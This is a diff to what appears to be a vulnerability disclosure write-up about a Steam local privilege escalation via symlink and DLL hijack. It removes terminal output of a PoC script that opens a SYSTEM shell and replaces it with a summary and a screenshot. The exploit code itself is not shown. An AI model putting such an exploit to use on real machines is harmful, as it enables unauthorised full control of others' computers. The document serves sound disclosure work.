@@ -352,36 +352,11 @@ Every single step works from a standard, non-elevated user account.
 
 ## The Result
 
-```
-C:\Users\aiman>cd Downloads
-
-C:\Users\aiman\Downloads>python .\steam_lpe_system.py
-======================================================================
- Steam LPE PoC - SYSTEM Code Execution via Symlink + DLL Hijack
- NO ADMIN PRIVILEGES REQUIRED
- Valve HackerOne bug bounty PoC
-======================================================================
-
-======================================================================
- [!!!] SYSTEM CODE EXECUTION CONFIRMED (from prior run)
-======================================================================
-    === Steam LPE PoC SYSTEM proof ===
-User: SYSTEM
-Host: C:\WINDOWS\system32\svchost.exe
-PID: 5644
-======================================================================
-
-[*] Connecting to SYSTEM shell executor...
-    [+] SYSTEM shell active (whoami: nt authority\system)
-    Type commands. 'exit' to quit.
-
-SYSTEM> whoami
-nt authority\system
-```
-
-From an unprivileged local user to `NT AUTHORITY\SYSTEM`, in a single script, with zero admin privileges at any step.
+Running the PoC end to end: connect, trigger the symlink, reboot, reconnect, and the shell comes back as `NT AUTHORITY\SYSTEM`.
 
 ![PoC terminal output: the SYSTEM shell confirms "nt authority\system"](system-shell-proof.png)
+
+From an unprivileged local user to `NT AUTHORITY\SYSTEM`, in a single script, with zero admin privileges at any step.
 
 ## Why This Matters
 
